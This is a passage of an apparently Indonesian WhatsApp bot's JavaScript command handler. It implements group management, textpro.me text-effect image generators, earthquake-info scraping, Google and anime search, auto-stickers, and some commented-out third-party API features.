}
break


case 'out':
if (!isGroup) return 
if (!isOwner) return onlyOwner()
await conn.groupLeave(from)
break


case 'moveongc':{
if (isGroup && !isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
if(isGroup && !q) return setReply("Masukan linkgc")
if(!isGroup && !q) return setReply(`Ketik ${prefix+command} idGc|linkgc`)
if(!isGroup && !q.includes("|")) return setReply(`Ketik ${prefix+command} idGc|linkgc`) 
let idGc= isGroup? from : q.split("|")[0];
let linkGc = isGroup? q : q.split("|")[1]
let rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = isGroup? q.match(rex1) : q.split("|")[1].match(rex1)
if (code == null) return  setReply("No invite url detected.");
let kode = code[0].replace("chat.whatsapp.com/", "");
let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(kode).catch(async () => {
return setReply("Invalid invite url.");
});

let position = null
Object.keys(sewa).forEach((i) => {
if (sewa[i].id === idGc) {
position = i
}
})

if (position !== null) {
sewa[position].id = id
sewa[position].group = subject
sewa[position].linkgc = linkGc

 let text =`
Succes move 

*Name:* ${subject}
*Id:* ${id}
*Days:* ${conn.msToDate(sewa[position].expired - Date.now())}
*Countdown:* ${sewa[position].expired - Date.now()}`
await conn.sendMessage(from,{text},{quoted: setQuoted})
await conn.groupAcceptInvite(kode)
await sleep(2000)
await conn.groupLeave(idGc)
await sleep(2000)
await conn.sendMessage(id,{text:"Move on gc succes"},{quoted: setQuoted})
 } else setReply("id group tidak di temukan di data base")

}
break


/*case 'circuit': case 'classic8bit': case 'color-fireworks': case 'cool-metal': case 'cutegirl': case 'dark-gold-metal': case 'decorated-cookie': case 'deluxe-gold': case 'deluxe-silver': case 'dinamo': case 'double-exposure': case 'dragon-fire': case 'eroded-metal': case 'fabric-text': case 'firework': case 'floraltext': case 'fox-crossfire': case 'fun-certify1': case 'fun-certify2': case 'futuristic': case 'galaxy-angel': case 'galaxy-effect': case 'galaxy-effect2': case 'galaxy-text': case 'galaxy-text-3': case 'gankk-league-of-kings': case 'gemstone': case 'genji-overwatch': case 'glossy': case 'glossy-bluemetal': case 'glossy-carbon': case 'glossy-chrome': case 'gold-avenger': case 'gold-barcar': case 'gold-batman': case 'gold-bird2': case 'gold-eagle': case 'gold-effect': case 'gold-fox': case 'gold-glitter': case 'gold-lion': case 'gold-lion2': case 'gold-star': case 'gold-tiger': case 'golden-letter': case 'gr-crossfire': case 'gradientlogo': case 'graffiti-color': case 'graffiti-text3':
case '1917-style': case '3d-effect': case '3d-rubystone': case '3d-text-sub-zombie': case '3dengraved': case '3dgalaxy-metal': case '3dgold': case '3dgolden': case '3dgradient': case '3dlove': case '3dluxury': case '3dneonlight': case '3dpapercut': case '3drainbow': case '3drealistic': case '3drosegold': case '3dscifi': case '3dsilver': case '3dspace': case '3dstone': case '3dtext-effect': case '3dunderwater': case '3dvintage': case '3dwaterpipe': case 'alice-league-of-kings': case 'angel-wing-galaxy': case 'anubis': case 'arch-crossfire': case 'art-shader': case 'assassins-creed': case 'avengers': case 'azzenka-league-of-kings': case 'balloons-cards': case 'balloons-love': case 'bearlogo': case 'bg-crossfire': case 'birthday-cake': case 'birthday-cards': case 'birthday-greeting': case 'birthday-roses': case 'black-metal': case 'blackpink': case 'blood-frosted': case 'blood-text': case 'blue-effect': case 'blue-glitter': case 'brickwall': case 'brokentext': case 'bubble-effect': case 'bulb-effectcase': {
if (!isGroup) return setReply(mess.only.group)
//conn.sendMessage(m.chat, { react: { text: emot, key: m.key }})        
            if (!q) return setReply(`Example : ${prefix + command} text`)
                setReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://violetics.pw/api/textpro/${command}?apikey=e939-5eff-ded0&text=${q}` }, caption: `${command}` }, { quoted: m})
	        }
            break  */
case'glitch':
if (!isGroup) return setReply(mess.only.group)
if(!q) return reply(`Use ${prefix + command} text|text`)
reply(mess.wait)
let teks170 = q.split("|")[0]
let teks270 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks170}`,`${teks270}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dbox':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
.catch((err) => console.log(err));
break


case 'waterdrop':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
    .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
    .catch((err) => console.log(err));
     break


case 'lion2':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
  reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break


case 'papercut':
if (!isGroup) return setReply(mess.only.group)
      if(!q) return reply(`Use ${prefix + command} text`)
      reply(mess.wait)
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break


case 'transformer':
if (!isGroup) return setReply(mess.only.group)
      if(!q) return reply(`Use ${prefix + command} text`)
      reply(mess.wait)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
.catch((err) => console.log(err));
break
   

case 'harrypot':
if (!isGroup) return setReply(mess.only.group)
       if(!q) return reply(`Use ${prefix + command} text|text`)
       reply(mess.wait)
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break


case 'neondevil':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
      reply(mess.wait)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break


case '3dstone':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break


case '3davengers':
if (!isGroup) return setReply(mess.only.group)
if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break


case 'thunder':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   

case 'window':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   case 'blackpinkneon':{
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
}
   break

case 'graffiti':
   case 'grafiti':{
   if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text|text`)
reply(mess.wait)
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
}
   break



case 'pornhub':{
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
}
   break



case 'blackpink2':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break


case 'glitchtext':
if (!isGroup) return setReply(mess.only.group)
if(!q) return reply(`Use ${prefix + command} text|text`)
reply(mess.wait)
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break


case '3dspace':
if (!isGroup) return setReply(mess.only.group)
if(!q) return reply(`Use ${prefix + command} text|text`)
reply(mess.wait)
let teks91 = q.split("|")[0]
let teks02 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks91}`,`${teks02}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'lion':
if (!isGroup) return setReply(mess.only.group)
if(!q) return reply(`Use ${prefix + command} text|text`)
reply(mess.wait)
let teks17 = q.split("|")[0]
let teks20 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks17}`,`${teks20}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case '3dneon':
if (!isGroup) return setReply(mess.only.group)
if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'neon':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'greenneon':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   
  
case 'bokeh':
if (!isGroup) return setReply(mess.only.group)   
if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   

case 'holographic':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'bear':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'wolf':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
let teks10 = q.split("|")[0]
let teks29 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks10}`,`${teks29}`])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break




case 'joker':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break


case 'dropwater2':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   case 'summertime':
   if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neonlight2':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thewall':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'natural':
if (!isGroup) return setReply(mess.only.group)
  if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 


case 'pencil':
if (!isGroup) return setReply(mess.only.group)
   if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
  case 'carbon':
    if(!q) return reply(`Use ${prefix + command} text`)
setReply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => conn.sendMessage(m.chat, { image: { url: data }, caption: `${command}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
    case 'gempanow':
case 'infogempa':{
const scrapy = await import("node-scrapy")
const model = ['tr:nth-child(1) td']
fetch('https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg').then((res) => res.text()).then((body) => {
let result = scrapy.extract(body, model)
let waktu = result[1] || "Tidak ada data"
let lintang = result[2] || "Tidak ada data"
let bujur = result[3] || "Tidak ada data";
let magnitudo = result[4] || "Tidak ada data"
let kedalaman = result[5] || "Tidak ada data"
let lokasi = result[6] || "Tidak ada data"
let teks = `*INFORMASI GEMPA TERBARU*\n\n◦️ Waktu: *${waktu}*\n◦️ Bujur: *${bujur}*\n◦️ Lintang: *${lintang}*\n◦️ Magnitudo: *${magnitudo}*\n◦️ Kedalaman: *${kedalaman}*\n◦️ Lokasi: *${lokasi}*`.trim()
setReply(teks)
 })
 }
 break
  case 'google':{
if (!q) return setReply('masukan teks')
if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
let ggs = require('google-it')
 ggs({ 'query': q }).then(results => {
let vars =``
vars += `*─────〈〈️ Google 〉〉─────*\n\n_*Hasil Pencarian : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var teks = vars.trim()
xdev.sendMessage(from,  {text : teks }, { quoted: dev })
//setReply(lama)
})
}
break
case 'jadianime':
if (!isGroup) return setReply(mess.only.group)
if (!isImage && !isQuotedImage) return reply(`Kirim gambar lalu reply ${prefix + command} atau tag gambar yang sudah dikirim`)
setReply(mess.wait)
try{
let ahah = await conn.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
//ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
let gambar = await getBuffer(`https://api.caliph.biz.id/api/animeai?img=${owgi}&apikey=${caliphkey}`)
//conn.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: m})
conn.sendMessage(from, { image: gambar, caption: `*Amjay Kamu jadi animej*`}, { quoted: m })
fs.unlinkSync(ahah) 
}catch(err){
console.log(err)
setReply(`Muka nya ga kelihatan kak`)
}
break    
    case 'otaku': case 'otakudesu': case 'otakudesusearch': case 'animesearch':{
if (!q) return setReply(`Mau Cari anime apa?\nContoh: ${prefix + command} Mushoku Tensei`)
setReply(mess.wait)
      try{
var anu = await fetchJson(`https://api.caliph.biz.id/api/otakudesu?query=${q}&apikey=${caliphkey}`)
var ini_txt = `Title : ${anu.judul}\nRanting : ${anu.rating}\nProduser : ${anu.produser}\nType : ${anu.type}\nTotal Episode : ${anu.episode}\nDurasi : ${anu.durasi}\nWaktu rilis : ${anu.rilis}\nStudio : ${anu.studio}\nGendre : ${anu.genre}\n\nLink anime nya : ${anu.LinkDown}`

conn.sendMessage(m.chat, { image: { url: anu.thumb }, caption: ini_txt }, { quoted: m})
        } catch (err){
console.log(err)
setReply("Anime tidak di temukan")
      }
}
break
 //FEATURE LOLKEY
 /*   case 'indo': case 'meme':{
if (!isGroup) return setReply(mess.only.group)
let get_result = await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=${apikey}`)
let but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
xdev.sendMessage(from,  {image: get_result, caption: `*${mess.success}*`}, { quoted: dev }).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
     
    case 'listsurah': {
setReply(mess.wait)
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
var get_result = get_result.result
var ini_txt = 'List Surah : \n'
for (var x in get_result) {
ini_txt += `${x}. ${get_result[x]}\n`
}
setReply(ini_txt)
}
break
case 'asmaulhusna':{
setReply(mess.wait)
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
var get_result = get_result.result
ini_txt = `No : ${get_result.index}\n`
ini_txt += `Latin: ${get_result.latin}\n`
ini_txt += `Arab : ${get_result.ar}\n`
ini_txt += `Indonesia : ${get_result.id}\n`
ini_txt += `English : ${get_result.en}`
setReply(ini_txt)
}
break
case 'kisahnabi':{
if (args.length == 0) return setReply(`Example: ${prefix + command} Muhammad`)
setReply(mess.wait)
query = args.join(" ")
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${apikey}`)
var get_result = get_result.result
ini_txt = `Name : ${get_result.name}\n`
ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
ini_txt += `Umur : ${get_result.age}\n`
ini_txt += `Tempat : ${get_result.place}\n`
ini_txt += `Story : \n${get_result.story}`
setReply(ini_txt)
}
break
case 'quotesimage':{
if (!isGroup) return setReply(mess.only.group)
let get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
let but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
xdev.sendMessage(from,  {image: get_result, caption: `*${mess.success}*`}, { quoted: dev }).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case 'randommeme':{
if (!isGroup) return setReply(mess.only.group)
let get_result = await getBuffer(`https://api.ibeng.tech/api/random/memeh?apikey=${apibeng}`)
let but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
xdev.sendMessage(from,  {image: get_result, caption: `*${mess.success}*`}, { quoted: dev }).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case 'quotesdilan': case 'quotes':{
if (!isGroup) return setReply(mess.only.group)
let quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${apikey}`)
setReply(quotedilan.result+'\n\n-- Dilan ').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case 'quotesislami':{
if (!isGroup) return setReply(mess.only.group)
let quotedislami = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${apikey}`)
setReply(quotedislami.result+'\n\n-- Semoga Bermanfaat ').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break	
case 'bucin2':{
if (!isGroup) return setReply(mess.only.group)
let quotedbucin = await fetchJson(`https://api.lolhuman.xyz/api/random/bucin?apikey=${apikey}`)
setReply(quotedbucin.result+'\n\n-- Bucin Terus ').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case 'bucin3':{
if (!isGroup) return setReply(mess.only.group)
let quotedbucin = await fetchJson(`https://api.lolhuman.xyz/api/random/katabucin?apikey=${apikey}`)
setReply(quotedbucin.result+'\n\n-- Kata Bucin ').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case  'pantun':{
if (!isGroup) return setReply(mess.only.group)
let get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
setReply(get_result.result+'\n\n-- Pantun').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
  case 'asupan':{
if (!isGroup) return setReply(mess.only.group)
if (!q) return setReply(`${app}asupan cecan\n${app}asupan chinese\n${app}asupan indonesia\n${app}asupan japan\n${app}asupan korea\n${app}asupan malaysia\n${app}asupan thailand\n${app}asupan vietnam\n\nExample; #asupan chinese`)
    setReply(mess.wait)
if (bb === 'cecan'){ 
buffer = await getBuffer(`https://violetics.pw/api/asupan/cecan?apikey=${apiKey}`)
conn.sendMessage(from, {image:buffer}, {quoted:setQuoted})
} else if (bb === 'chinese'){ 
let bufferr = await getBuffer(`https://violetics.pw/api/asupan/chinese?apikey=${apiKey}`)
conn.sendMessage(from, {image:bufferr}, {quoted:setQuoted})
} else if (bb === 'indonesia'){ let buffers = await getBuffer(`https://violetics.pw/api/asupan/indonesia?apikey=${apiKey}`)
conn.sendMessage(from, {image:buffers}, {quoted:setQuoted})
} else if (bb === 'japan'){ 
let buffetr = await getBuffer(`https://violetics.pw/api/asupan/japan?apikey=${apiKey}`)
conn.sendMessage(from, {image:buffetr}, {quoted:setQuoted})
} else if (bb === 'korea'){ 
let bufffer = await getBuffer(`https://violetics.pw/api/asupan/korea?apikey=${apiKey}`)
conn.sendMessage(from, {image:bufffer}, {quoted:setQuoted}) 
} else if (bb === 'malaysia'){ 
let bufferb = await getBuffer(`https://violetics.pw/api/asupan/malaysia?apikey=${apiKey}`)
conn.sendMessage(from, {image:bufferb}, {quoted:setQuoted})
} else if (bb === 'thailand'){ 
  let bufcfer = await getBuffer(`https://violetics.pw/api/asupan/thailand?apikey=${apiKey}`)
conn.sendMessage(from, {image:bufcfer}, {quoted:setQuoted})
} else if (bb === 'vietnam'){ 
  let buoffer = await getBuffer(`https://violetics.pw/api/asupan/vietnam?apikey=${apiKey}`)
conn.sendMessage(from, {image:buoffer}, {quoted:setQuoted})
} else { m.reply(`Error Harap Ulngi Command`) }
  }
        break
 
case 'jadwaltvnow':{
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var get_result = get_result.result
ini_txt = `JADWAL TV NOW :\n\n`
for (var x in get_result) {
ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
}
setReply(ini_txt)
}
break
case 'hoak':
case 'hoax':{
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=${apikey}`)
var get_result = get_result.result
ini_txt = 'INFO HOAX :\n\n'
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Posted : ${x.posted}\n`
ini_txt += `Description : ${x.desc}\n\n`
}
setReply(ini_txt)
}
break
case 'xnxxsearch':{
if (!isGroup) return setReply(mess.only.group)
if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
query = args.join(" ")
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${apikey}&query=${query}`)
var get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Views : ${x.views}\n`
ini_txt += `Duration : ${x.duration}\n`
ini_txt += `Uploader : ${x.uploader}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
}
setReply(ini_txt)
}
break
case 'hentaisearch':{
if (!isGroup) return setReply(mess.only.group)
if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
query = args.join(" ")
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apikey}&query=${query}`)
var get_result = get_result.result
ini_txt = "*Result :* \n\n"
for (var x of get_result) {
ini_txt += `Id : ${x.id}\n`
ini_txt += `Title English : ${x.title_english}\n`
ini_txt += `Title Japanese : ${x.title_japanese}\n`
ini_txt += `Native : ${x.title_native}\n`
ini_txt += `Upload : ${x.date_upload}\n`
ini_txt += `Page : ${x.page}\n`
ini_txt += `Favourite : ${x.favourite}\n\n`
}
setReply(ini_txt)
}
break
case 'nekopoisearch':{
if (!isGroup) return setReply(mess.only.group)
if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
query = args.join(" ")
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${apikey}&query=${query}`)
var get_resultt = get_result.result
ini_txt = ""
for (var x of get_resultt) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
}
setReply(ini_txt)
}
break
*/  
//------------------------ BATAS DARI AREA CASE -----------------------------\\   
default:
if (isCmd) {
await _data.Nothing(toFirstCase(command), dash, allcommand)
const stringSimilarity = require("string-similarity");
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
conn.sendMessage(m.chat, { react: { text: `❌`, key: m.key }})
//setReply(`Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`)
} 


    
}//Akhir switch command



//Auto sticker  
if (isImage && autoSticker) {
try{
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (m.msg || m).mimetype || ''
if (/image/.test(mime)) {
let img = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await conn.sendMessage(from, { sticker: sticBuffer }, {
quoted: m,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}catch(err){

}
}




//ketika ada yang invite/kirim link grup di chat pribadi
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
conn.sendButLoc(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), gbutsan)
}

//User Private Chat
if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {
} else if(!isGroup && user && isPremium && !itsMe) {
